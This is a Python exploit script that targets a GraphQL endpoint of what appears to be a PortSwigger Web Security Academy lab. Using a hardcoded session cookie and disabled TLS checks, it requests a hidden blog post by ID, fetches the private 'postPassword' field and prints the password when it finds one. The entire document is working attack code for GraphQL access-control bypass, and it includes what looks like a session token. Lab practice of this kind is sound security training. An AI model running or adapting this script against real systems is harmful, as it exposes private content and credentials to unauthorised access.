#!/usr/bin/env python3
import requests
import json
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

TARGET = "https://0ac3001d04afd00580ed3ac3009f0027.web-security-academy.net/graphql/v1"
SESSION = "khKFJGWyI0CouGOCVwrwqO8OzVPDuun4"

headers = {
    "Cookie": f"session={SESSION}",
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
}

# Query for post ID 3 specifically
query = {
    "query": """
    query getPost3 {
        getBlogPost(id: 3) {
            id
            image
            title
            author
            date
            summary
            paragraphs
            isPrivate
            postPassword
        }
    }
    """,
    "operationName": "getPost3"
}

print("[*] Querying for hidden post ID 3...")
response = requests.post(TARGET, headers=headers, json=query, verify=False)

if response.status_code == 200:
    data = response.json()
    post = data.get('data', {}).get('getBlogPost')

    if post:
        print("[+] Found post 3!\n")
        print("="*60)
        print(f"ID: {post.get('id')}")
        print(f"Title: {post.get('title')}")
        print(f"Author: {post.get('author')}")
        print(f"Private: {post.get('isPrivate')}")
        print(f"Password: {post.get('postPassword')}")
        print(f"Summary: {post.get('summary')}")
        print(f"Paragraphs: {post.get('paragraphs')}")
        print("="*60)

        if post.get('postPassword'):
            print(f"\n🔑 FOUND PASSWORD: {post.get('postPassword')}")
    else:
        print("[-] Post 3 not found or returned null")
        print(f"Response: {json.dumps(data, indent=2)}")
else:
    print(f"[-] Request failed: {response.status_code}")
    print(f"Response: {response.text}")
